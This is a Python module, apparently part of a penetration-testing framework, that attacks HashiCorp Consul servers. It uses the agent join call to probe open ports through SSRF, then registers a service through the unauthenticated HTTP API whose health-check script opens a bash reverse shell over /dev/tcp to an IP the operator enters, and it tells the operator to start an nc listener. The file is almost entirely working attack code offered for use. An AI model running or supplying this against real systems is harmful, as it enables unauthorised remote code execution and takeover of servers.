import logging

import consul
import requests
from consul import ConsulException

def check_ssrf(target,port):

    logging.info("Testing Consul for SSRF \n")
    con = consul.Consul(target,port=port)

    ports_to_check = [21,22,80,8000,8600] #Add your list of ports to check for
    check_errors = ["i/o timeout","invalid msgType"]

    for port in ports_to_check:

        try:
            con.agent.join(target+":"+str(port))
        except ConsulException as err:
            for error in check_errors:
                if error in err.__str__():
                    logging.info("Open Port "+str(port)+" found")


#Checks for RCE and if you are lucky gets you a reverse shell
def check_rce(target,port):

    logging.info("Testing Consul for RCE \n")

    try:
        to_continue = True

        if requests.put("http://"+target+":"+str(port)+"/v1/agent/service/register").status_code == 400:
            logging.info("HTTP API available \n")

    except Exception as err:
        logging.error(err)
        to_continue = False

    try:

        if to_continue:
            connect_back = raw_input("Enter ip to connect back: ")
            data = {
                      "ID": "http",
                      "Name": "http",
                      "Address": "127.0.0.1",
                      "Port": 80,
                      "check": {
                         "script": "bash -i >& /dev/tcp/"+connect_back+"/8080 0>&1",
                         "interval": "10s"
                       }
                    }
            requests.put("http://"+target+":"+str(port)+"/v1/agent/service/register",json=data)

            logging.info("Looks like you have some luck, Open a terminal and set nc -lv 8080")

    except Exception as err:
        logging.error(str(err))


def run(args,helpers):
    logging.info("Starting Attack phase for Consul\n")
    check_ssrf(args.ip,args.port)
    check_rce(args.ip,args.port)
